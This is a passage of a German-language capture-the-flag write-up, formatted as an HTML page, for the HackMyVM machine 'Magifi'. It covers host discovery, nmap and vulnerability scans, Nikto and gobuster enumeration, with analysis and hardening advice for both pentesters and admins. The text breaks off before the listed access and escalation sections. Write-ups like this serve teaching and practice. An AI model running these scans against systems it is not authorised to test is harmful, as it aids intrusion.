@@ -1,0 +1,1424 @@
+﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Magifi - HackMyVM - Hard - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Magifi - HackMyVM - Hard - Bericht</h1>
+        <div class="level-container level-hard">
+            <h2 class="level-hard">Hard</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <div class="tool-item">Shell Script (recon_script.sh)</div>
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">echo</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">grep</div>
+                 <div class="tool-item">curl</div>
+                 <div class="tool-item">nikto</div>
+                 <div class="tool-item">gobuster</div>
+                 <div class="tool-item">python3</div>
+                 <div class="tool-item">nc (netcat)</div>
+                 <div class="tool-item">wget</div>
+                 <div class="tool-item">chmod</div>
+                 <div class="tool-item">mv</div>
+                 <div class="tool-item">pwd</div>
+                 <div class="tool-item">ls</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">ssh</div>
+                 <div class="tool-item">sudo</div>
+                 <div class="tool-item">find</div>
+                 <div class="tool-item">hostapd-mana</div>
+                 <div class="tool-item">john</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+ 2245  X=$(./recon_script.sh jenk.nyx)
+ 2246  echo $X
+
+
+:::::::::::::::::::::::::::::::::: ARP-Scan ::::::::::::::::::::::::::::::::
+
+
+Interface: eth0, type: EN10MB, MAC: 08:00:27:ee:49:a2, IPv4: 192.168.2.199
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.1	38:e1:f4:22:ac:ac	(Unknown)
+192.168.2.30	8c:98:06:22:c3:49	SHENZHEN SEI ROBOTICS CO.,LTD
+192.168.2.31	bc:f8:7e:ac:41:00	(Unknown)
+192.168.2.32	80:47:86:96:f6:3a	Samsung Electronics Co.,Ltd
+192.168.2.120	84:25:19:2f:66:32	Samsung Electronics
+192.168.2.161	08:bf:b8:c1:fd:13	(Unknown)
+<span class="command">192.168.2.175	08:00:27:b0:dd:16	PCS Systemtechnik GmbH</span>
+
+
+::::::::::::::::::::: /etc/hosts :::::::::::::::::::
+
+                192.168.2.159   warzone1.vln
+                192.168.2.160   dc9.vln
+        #       192.168.2.161   dc2.vln dc-2
+                192.168.2.162   buster.hmv
+        #       192.168.2.163	dc1.vln
+                192.168.2.164   smol.hmv www.smol.hmv
+                192.168.2.165   plpl.hmv
+                192.168.2.167   jan.hmv
+        #       192.168.2.166   dc6.vln wordy
+        #       192.168.2.168	sick.vln
+        #       192.168.2.169	sick.vln
+        #       192.168.2.170	sick.vln
+                192.168.2.171   hero.hmv hero
+                192.168.2.172   up.hmv
+        #       192.168.2.173	sick.vln
+        #       192.168.2.174	sick.vln
+                <span class="command">192.168.2.175   magifi.hmv</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Block zeigt die Ausführung eines benutzerdefinierten Skripts namens `recon_script.sh`. Der Inhalt des Skripts ist nicht sichtbar, aber seine Ausgabe wird in der Variable `X` gespeichert und dann mit `echo $X` angezeigt. Die Ausgabe enthält:
+                <ul>
+                    <li>Einen `arp-scan`-Lauf im lokalen Netzwerk (192.168.2.0/24), der verschiedene Geräte findet. Besonders hervorgehoben ist `192.168.2.175` mit der MAC-Adresse `08:00:27:b0:dd:16`, die zu "PCS Systemtechnik GmbH" gehört (oft ein Indikator für VirtualBox).</li>
+                    <li>Den Inhalt der lokalen `/etc/hosts`-Datei des Angreifers. Diese enthält eine Zuordnung von `192.168.2.175` zum Hostnamen `magifi.hmv`.</li>
+                </ul>
+                Das Skript scheint also eine Kombination aus Netzwerkscan und lokaler Konfigurationsanzeige durchzuführen, um das Zielsystem zu identifizieren und dessen Namen zu bestätigen. Die Ziel-IP ist `192.168.2.175` und der zugehörige Hostname ist `magifi.hmv`.
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Verwendung eines Skripts zur Automatisierung der initialen Reconnaissance ist effizient. `arp-scan` ist gut geeignet für die schnelle Host-Entdeckung im LAN. Die Überprüfung der `/etc/hosts`-Datei stellt sicher, dass der richtige Hostname für das Ziel verwendet wird. Die Ziel-IP und der Hostname sind nun klar: `192.168.2.175` (`magifi.hmv`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die identifizierte IP-Adresse `192.168.2.175` (oder die Variable `$IP`, falls sie im Skript gesetzt wurde) für weitere Scans. Stellen Sie sicher, dass der Eintrag `192.168.2.175 magifi.hmv` in der `/etc/hosts`-Datei korrekt ist und nicht auskommentiert wurde.<br><strong>Empfehlung (Admin):</strong> Standardempfehlungen für ARP-Scan (Netzwerk-Monitoring, Inventarliste). Stellen Sie sicher, dass die Namensauflösung im Netzwerk konsistent ist (idealerweise über einen zentralen DNS-Server).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -AO -p- $IP -Pn --min-rate 5000 | grep open</span></div>
+                     <pre>
+<span class="command">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)</span>
+<span class="command">80/tcp open  http    Werkzeug/3.0.4 Python/3.8.10</span>
+                     </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser Nmap-Befehl scannt die Ziel-IP (`$IP` = 192.168.2.175).
+                 <ul>
+                     <li><code>-sS</code>: TCP SYN Scan (Stealth Scan).</li>
+                     <li><code>-sC</code>: Standard Skript-Scan.</li>
+                     <li><code>-sV</code>: Versionserkennung.</li>
+                     <li><code>-A</code>: Aktiviert OS-Erkennung, Versionserkennung, Skript-Scanning und Traceroute.</li>
+                     <li><code>-O</code>: Aktiviert OS-Erkennung (redundant zu -A, aber schadet nicht).</li>
+                     <li><code>-p-</code>: Scannt alle 65535 TCP-Ports.</li>
+                     <li><code>-Pn</code>: Überspringt die Host-Discovery (Ping-Scan) und geht davon aus, dass der Host online ist. Nützlich, wenn Hosts Ping-Anfragen blockieren.</li>
+                     <li><code>--min-rate 5000</code>: Sendet Pakete mit einer Mindestrate von 5000 Paketen pro Sekunde, um den Scan zu beschleunigen.</li>
+                     <li><code>| grep open</code>: Filtert die Ausgabe, um nur offene Ports anzuzeigen.</li>
+                 </ul>
+                 Die Ausgabe zeigt zwei offene Ports:
+                 <ul>
+                     <li>Port 22: SSH (OpenSSH 8.2p1 auf Ubuntu).</li>
+                     <li>Port 80: HTTP (Werkzeug/3.0.4, Python/3.8.10). "Werkzeug" ist eine WSGI-Bibliothek für Python, die oft mit Web-Frameworks wie Flask oder Django verwendet wird.</li>
+                 </ul>
+             </p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert erfolgreich die primären Angriffsvektoren: SSH und einen HTTP-Dienst, der von einer Python-Anwendung bereitgestellt wird. Die Verwendung von `-Pn` war hier notwendig, da der Host möglicherweise nicht auf Pings reagiert. Die hohe Rate (`--min-rate 5000`) beschleunigt den Scan erheblich, kann aber ungenau sein oder von IDS/IPS erkannt werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den HTTP-Dienst auf Port 80 genauer (Web-Enumeration, Schwachstellen-Scan). Überprüfen Sie die SSH-Version auf bekannte Schwachstellen und bereiten Sie sich auf mögliche Brute-Force-Angriffe vor, falls Benutzernamen bekannt werden.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass SSH sicher konfiguriert ist (aktuelle Version, Key-Authentifizierung bevorzugt, Passwort-Auth deaktivieren oder mit starken Passwörtern/Fail2Ban absichern). Überprüfen Sie die Sicherheit der Python-Webanwendung auf Port 80 und halten Sie verwendete Bibliotheken (wie Werkzeug) aktuell.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -AO -p- $IP -Pn --min-rate 5000</span></div>
+                     <pre>
+Starting Nmap 7.94SVN ( [Link: https://nmap.org | Ziel: https://nmap.org] ) at 2025-02-12 21:07 CET
+Nmap scan report for magifi.hmv (192.168.2.175)
+Host is up (0.0013s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)</span>
+| ssh-hostkey: 
+|   <span class="command">3072 0c:c6:d6:24:1e:5b:9e:66:25:0a:ba:0a:08:0b:18:40 (RSA)</span>
+|   <span class="command">256 9c:c3:1d:ea:22:04:93:b7:81:dd:f2:96:5d:f0:1f:9b (ECDSA)</span>
+|_  <span class="command">256 55:41:15:90:ff:1d:53:88:e7:65:91:4f:fd:cf:49:85 (ED25519)</span>
+<span class="command">80/tcp open  http    Werkzeug/3.0.4 Python/3.8.10</span>
+|_http-server-header: <span class="command">Werkzeug/3.0.4 Python/3.8.10</span>
+|_http-title: <span class="password">Did not follow redirect to http://hogwarts.htb</span>
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 302 FOUND
+|     Server: Werkzeug/3.0.4 Python/3.8.10
+|     Date: Wed, 12 Feb 2025 20:07:41 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 225
+|     Location: http://hogwarts.htb
+|     Connection: close
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at [Link: https://nmap.org/cgi-bin/submit.cgi?new-service | Ziel: https://nmap.org/cgi-bin/submit.cgi?new-service] :
+MAC Address: <span class="command">08:00:27:B0:DD:16 (Oracle VirtualBox virtual NIC)</span>
+Device type: <span class="command">general purpose</span>
+Running: <span class="command">Linux 4.X|5.X</span>
+OS CPE: <span class="command">cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span>
+OS details: <span class="command">Linux 4.15 - 5.8</span>
+Network Distance: 1 hop
+Service Info: OS: <span class="command">Linux; CPE: cpe:/o:linux:linux_kernel</span>
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   1.30 ms magifi.hmv (192.168.2.175)
+
+OS and Service detection performed. Please report any incorrect results at [Link: https://nmap.org/submit/ | Ziel: https://nmap.org/submit/] .
+Nmap done: 1 IP address (1 host up) scanned in 92.30 seconds
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dies ist die vollständige Ausgabe des vorherigen Nmap-Scans (ohne `| grep open`).
+                 Wichtige zusätzliche Details:
+                 <ul>
+                     <li>**SSH (Port 22):** Bestätigt OpenSSH 8.2p1 auf Ubuntu. Die Host Keys werden angezeigt.</li>
+                     <li>**HTTP (Port 80):** Bestätigt Werkzeug 3.0.4 mit Python 3.8.10. Nmap stellt fest, dass die Seite (`http-title`) eine Weiterleitung (`302 FOUND`) auf `http://hogwarts.htb` enthält. Dies ist ein entscheidender Hinweis auf einen weiteren Hostnamen, der untersucht werden muss.</li>
+                     <li>**Betriebssystem:** Linux, Kernel 4.x/5.x.</li>
+                     <li>**MAC-Adresse:** Bestätigt VirtualBox.</li>
+                 </ul>
+             </p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan liefert kritische Informationen. Die Weiterleitung auf `http://hogwarts.htb` ist der wichtigste neue Fund. Es bedeutet, dass die eigentliche Webanwendung unter diesem Hostnamen läuft und nicht direkt über die IP-Adresse oder `magifi.hmv` erreichbar ist. OpenSSH 8.2p1 ist nicht die neueste Version, hat aber bekannte Schwachstellen (wie später im Vuln-Scan gesehen).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fügen Sie den Eintrag `192.168.2.175 hogwarts.htb` zur lokalen `/etc/hosts`-Datei hinzu. Starten Sie die Web-Enumeration (Nikto, Gobuster etc.) nun gegen `http://hogwarts.htb`. Untersuchen Sie die OpenSSH-Version 8.2p1 auf bekannte Exploits (z.B. CVE-2023-38408).<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Weiterleitungen korrekt konfiguriert sind und nicht auf interne oder unerwartete Hosts verweisen. Aktualisieren Sie OpenSSH auf eine gepatchte Version. Überprüfen Sie die Notwendigkeit des Hostnamens `hogwarts.htb` und sichern Sie die darunter laufende Anwendung.</p>
+        </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration</h2>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -Iv http://$IP</span></div>
+                     <pre>
+*   Trying 192.168.2.175:80...
+* <span class="password">Connected to 192.168.2.175 (192.168.2.175) port 80</span>
+* using HTTP/1.x
+&gt; HEAD / HTTP/1.1
+&gt; Host: 192.168.2.175
+&gt; User-Agent: curl/8.10.1
+&gt; Accept: */*
+&gt; 
+* Request completely sent off
+&lt; <span class="password">HTTP/1.1 302 FOUND</span>
+HTTP/1.1 302 FOUND
+&lt; Server: Werkzeug/3.0.4 Python/3.8.10
+Server: Werkzeug/3.0.4 Python/3.8.10
+&lt; Date: Wed, 12 Feb 2025 20:09:30 GMT
+Date: Wed, 12 Feb 2025 20:09:30 GMT
+&lt; Content-Type: text/html; charset=utf-8
+Content-Type: text/html; charset=utf-8
+&lt; Content-Length: 225
+Content-Length: 225
+&lt; <span class="command">Location: http://hogwarts.htb</span>
+Location: http://hogwarts.htb
+&lt; Connection: close
+Connection: close
+&lt; 
+
+* shutting down connection #0
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `curl -Iv http://$IP` sendet eine HEAD-Anfrage (`-I`) an die IP-Adresse des Ziels und zeigt die Header der Antwort (`-v`). Die Ausgabe bestätigt die von Nmap festgestellte Weiterleitung: Der Server antwortet mit `HTTP/1.1 302 FOUND` und einem `Location`-Header, der auf `http://hogwarts.htb` verweist.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt, dass der direkte Zugriff auf die IP-Adresse zu einer Weiterleitung führt. Die eigentliche Webanwendung muss über den Hostnamen `hogwarts.htb` angesprochen werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass `hogwarts.htb` in der `/etc/hosts`-Datei auf `192.168.2.175` verweist, und führen Sie alle weiteren Web-Scans gegen `http://hogwarts.htb` durch.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Konfiguration des Webservers (z.B. Apache oder Nginx VHost-Konfiguration, oder die Python-Anwendung selbst), um sicherzustellen, dass diese Weiterleitung beabsichtigt ist und korrekt funktioniert.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          <span class="command">192.168.2.175</span>
++ Target Hostname:    <span class="command">192.168.2.175</span>
++ Target Port:        <span class="command">80</span>
++ Start Time:         2025-02-12 21:09:31 (GMT1)
+---------------------------------------------------------------------------
++ Server: <span class="command">Werkzeug/3.0.4 Python/3.8.10</span>
++ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]
++ /: <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]
++ <span class="command">Root page / redirects to: http://hogwarts.htb</span>
++ <span class="password">No CGI Directories found</span> (use '-C all' to force check all possible dirs)
++ <span class="password">Python/3.8.10 appears to be outdated (current is at least 3.9.6).</span>
++ 8102 requests: 0 error(s) and 3 item(s) reported on remote host
++ End Time:           2025-02-12 21:10:10 (GMT1) (39 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Diese Ausgabe stammt von einem Nikto-Scan, der direkt gegen die IP-Adresse `192.168.2.175` ausgeführt wurde (ohne Angabe des Hostnamens `hogwarts.htb`).
+                 Wichtige Funde:
+                 <ul>
+                     <li>Bestätigt den Server: Werkzeug/3.0.4 Python/3.8.10.</li>
+                     <li>Meldet fehlende `X-Frame-Options`- und `X-Content-Type-Options`-Header.</li>
+                     <li>Stellt fest, dass die Root-Seite (`/`) auf `http://hogwarts.htb` weiterleitet.</li>
+                     <li>Markiert Python 3.8.10 als potenziell veraltet.</li>
+                 </ul>
+             </p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan gegen die IP-Adresse liefert aufgrund der Weiterleitung nur begrenzte Informationen über die eigentliche Anwendung. Die Hinweise auf fehlende Security Header und die veraltete Python-Version sind jedoch relevant. Python 3.8 ist das Ende seines Lebenszyklus nahe oder hat es bereits erreicht, was potenzielle Sicherheitsrisiken birgt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie Nikto erneut aus, diesmal gegen `http://hogwarts.htb` (`nikto -h http://hogwarts.htb`), um die eigentliche Anwendung zu scannen, nachdem der `/etc/hosts`-Eintrag gesetzt wurde. Berücksichtigen Sie die potenziell veraltete Python-Version bei der Suche nach Schwachstellen.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie die fehlenden Security Header (`X-Frame-Options`, `X-Content-Type-Options`). Planen Sie ein Upgrade der Python-Version auf eine aktuell unterstützte Version (z.B. 3.9+). Stellen Sie sicher, dass alle Abhängigkeiten der Anwendung (wie Werkzeug) ebenfalls aktuell sind.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">gobuster dir -u "http://$IP" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map,pHtml -b '503,404,403' -e --no-error -k</span></div>
+                     <pre>
+[Keine Gobuster-Ausgabe gezeigt, außer dem späteren Hinweis auf /upload]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser Gobuster-Befehl versucht, Verzeichnisse und Dateien auf der IP-Adresse (`http://$IP`) zu bruteforcen. Die Optionen sind ähnlich wie zuvor (mittlere Wortliste, viele Erweiterungen), aber zusätzlich wird der Statuscode 403 ignoriert (`-b '503,404,403'`). Es wird keine direkte Ausgabe des Scans gezeigt, aber ein späterer Kommentar im Originaltext deutet darauf hin, dass bei einem Scan gegen `http://hogwarts.htb` der Pfad `/upload` mit Status 405 (Method Not Allowed) gefunden wurde.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ein Gobuster-Scan direkt gegen die IP-Adresse ist aufgrund der Weiterleitung auf `hogwarts.htb` wahrscheinlich wenig effektiv. Der spätere Fund von `/upload` auf `hogwarts.htb` ist jedoch relevant. Ein Status 405 deutet darauf hin, dass der Pfad existiert, aber die verwendete HTTP-Methode (standardmäßig GET bei Gobuster `dir`) nicht erlaubt ist. Dies ist oft bei Endpunkten der Fall, die nur POST-Anfragen (z.B. für Uploads) akzeptieren.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie Gobuster gegen `http://hogwarts.htb` aus. Wenn Pfade wie `/upload` mit 405 gefunden werden, testen Sie diese explizit mit anderen HTTP-Methoden (z.B. POST mit `curl -X POST` oder in Burp Suite).<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Webserver und Anwendungen korrekte HTTP-Statuscodes zurückgeben. Beschränken Sie den Zugriff auf Endpunkte wie Upload-Pfade auf authentifizierte und autorisierte Benutzer.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+http://hogwarts.htb/upload               (Status: 405) [Size: 153]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dies ist die (vermutlich aus einem Gobuster-Scan gegen `http://hogwarts.htb` stammende) Information, dass der Pfad `/upload` existiert, aber auf GET-Anfragen mit dem Statuscode 405 (Method Not Allowed) antwortet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Existenz eines Upload-Endpunkts. Der 405-Status ist ein starker Hinweis darauf, dass hier POST-Anfragen erwartet werden, was typisch für Datei-Uploads ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den `/upload`-Endpunkt manuell mit einem Browser oder Tools wie Burp Suite. Senden Sie eine POST-Anfrage, um zu sehen, ob ein Upload-Formular angezeigt wird oder wie der Endpunkt reagiert. Suchen Sie nach Hinweisen auf erlaubte Dateitypen oder Größenbeschränkungen.<br><strong>Empfehlung (Admin):</strong> Sichern Sie den `/upload`-Endpunkt. Implementieren Sie Authentifizierung, Autorisierung und strikte Dateityp-/Größenvalidierung, wie zuvor bei Upload-Funktionen empfohlen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sV -A --script vuln 192.168.2.144 -T5</span></div>
+                     <pre>
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)</span>
+| vulners: 
+|   cpe:/a:openbsd:openssh:8.2p1: 
+|     	<span class="password">95499236-C9FE-56A6-9D7D-E943A24B633A	10.0	[Link: https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A | Ziel: https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A]	*EXPLOIT*</span>
+|     	<span class="password">2C119FFA-ECE0-5E14-A4A4-354A2C38071A	10.0	[Link: https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A | Ziel: https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A]	*EXPLOIT*</span>
+|     	<span class="password">CVE-2023-38408	9.8	[Link: https://vulners.com/cve/CVE-2023-38408 | Ziel: https://vulners.com/cve/CVE-2023-38408]</span>
+|     	<span class="password">B8190CDB-3EB9-5631-9828-8064A1575B23	9.8	[Link: https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23 | Ziel: https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23]	*EXPLOIT*</span>
+|     	<span class="password">8FC9C5AB-3968-5F3C-825E-E8DB5379A623	9.8	[Link: https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8DB5379A623 | Ziel: https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8DB5379A623]	*EXPLOIT*</span>
+|     	<span class="password">8AD01159-548E-546E-AA87-2DE89F3927EC	9.8	[Link: https://vulners.com/githubexploit/8AD01159-548E-546E-AA87-2DE89F3927EC | Ziel: https://vulners.com/githubexploit/8AD01159-548E-546E-AA87-2DE89F3927EC]	*EXPLOIT*</span>
+|     	<span class="password">887EB570-27D3-11EE-ADBA-C80AA9043978	9.8	[Link: https://vulners.com/freebsd/887EB570-27D3-11EE-ADBA-C80AA9043978 | Ziel: https://vulners.com/freebsd/887EB570-27D3-11EE-ADBA-C80AA9043978]</span>
+|     	<span class="password">5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A	9.8	[Link: https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A | Ziel: https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A]	*EXPLOIT*</span>
+|     	<span class="password">33D623F7-98E0-5F75-80FA-81AA666D1340	9.8	[Link: https://vulners.com/githubexploit/33D623F7-98E0-5F75-80FA-81AA666D1340 | Ziel: https://vulners.com/githubexploit/33D623F7-98E0-5F75-80FA-81AA666D1340]	*EXPLOIT*</span>
+|     	<span class="password">0221525F-07F5-5790-912D-F4B9E2D1B587	9.8	[Link: https://vulners.com/githubexploit/0221525F-07F5-5790-912D-F4B9E2D1B587 | Ziel: https://vulners.com/githubexploit/0221525F-07F5-5790-912D-F4B9E2D1B587]	*EXPLOIT*</span>
+|     	<span class="password">PACKETSTORM:179290	8.1	[Link: https://vulners.com/packetstorm/PACKETSTORM:179290 | Ziel: https://vulners.com/packetstorm/PACKETSTORM:179290]	*EXPLOIT*</span>
+|     	<span class="password">FB2E9ED1-43D7-585C-A197-0D6628B20134	8.1	[Link: https://vulners.com/githubexploit/FB2E9ED1-43D7-585C-A197-0D6628B20134 | Ziel: https://vulners.com/githubexploit/FB2E9ED1-43D7-585C-A197-0D6628B20134]	*EXPLOIT*</span>
+|     	<span class="password">FA3992CE-9C4C-5350-8134-177126E0BD3F	8.1	[Link: https://vulners.com/githubexploit/FA3992CE-9C4C-5350-8134-177126E0BD3F | Ziel: https://vulners.com/githubexploit/FA3992CE-9C4C-5350-8134-177126E0BD3F]	*EXPLOIT*</span>
+|     	<span class="password">F8981437-1287-5B69-93F1-657DFB1DCE59	8.1	[Link: https://vulners.com/githubexploit/F8981437-1287-5B69-93F1-657DFB1DCE59 | Ziel: https://vulners.com/githubexploit/F8981437-1287-5B69-93F1-657DFB1DCE59]	*EXPLOIT*</span>
+|     	<span class="password">F58A5CB2-2174-586F-9CA9-4C47F8F38B5E	8.1	[Link: https://vulners.com/githubexploit/F58A5CB2-2174-586F-9CA9-4C47F8F38B5E | Ziel: https://vulners.com/githubexploit/F58A5CB2-2174-586F-9CA9-4C47F8F38B5E]	*EXPLOIT*</span>
+<span class="command">80/tcp open  http    Werkzeug/3.0.4 Python/3.8.10</span>
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-server-header: Werkzeug/3.0.4 Python/3.8.10
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 302 FOUND
+|     Server: Werkzeug/3.0.4 Python/3.8.10
+|     Date: Wed, 12 Feb 2025 20:10:56 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 225
+|     Location: http://hogwarts.htb
+|     Connection: close
+|     <span class="password">http-slowloris-check:</span> 
+|   <span class="password">VULNERABLE:</span>
+|   Slowloris DOS attack
+|     State: LIKELY VULNERABLE
+|     IDs:  CVE:CVE-2007-6750
+|       Slowloris tries to keep many connections to the target web server open and hold
+|       them open as long as possible.  It accomplishes this by opening connections to
+|       the target web server and sending a partial request. By doing so, it starves
+|       the http server's resources causing Denial Of Service.
+|       
+|     Disclosure date: 2009-09-17
+|     References:
+|       http://ha.ckers.org/slowloris/
+|_      [Link: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750 | Ziel: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750]
+
+Starting Nmap 7.94SVN ( [Link: https://nmap.org | Ziel: https://nmap.org] ) at 2025-02-12 21:10 CET
+Pre-scan script results:
+| broadcast-avahi-dos: 
+|   Discovered hosts:
+|     224.0.0.251
+|   After NULL UDP avahi packet DoS (CVE-2011-1002).
+|_  Hosts are all up (not vulnerable).
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser Nmap-Scan ist mit `--script vuln` auf die **IP-Adresse 192.168.2.144** gerichtet, nicht auf das bisherige Ziel `192.168.2.175`. Es ist unklar, warum hier eine andere IP gescannt wird. Möglicherweise ein Fehler im Log oder ein paralleler Scan einer anderen Maschine. Die Ergebnisse für Port 22 (SSH) und Port 80 (HTTP) ähneln jedoch stark denen von `192.168.2.175`.
+                 <ul>
+                     <li>**SSH (Port 22):** Die Version OpenSSH 8.2p1 wird gefunden. Das `vulners`-Skript meldet zahlreiche potenzielle Schwachstellen und Exploits, darunter **CVE-2023-38408** (Remote Code Execution via forwarded agent socket) und mehrere GitHub-Exploits mit hohen Scores.</li>
+                     <li>**HTTP (Port 80):** Werkzeug/3.0.4 Python/3.8.10 wird gefunden. Es werden keine XSS- oder CSRF-Schwachstellen durch die Standard-Skripte entdeckt. Allerdings wird der Server als **LIKELY VULNERABLE** für den **Slowloris Denial-of-Service (DoS)** Angriff (CVE-2007-6750) eingestuft.</li>
+                 </ul>
+                 Die Pre-Scan-Skripte (Avahi DoS) zeigen keine Verwundbarkeit.
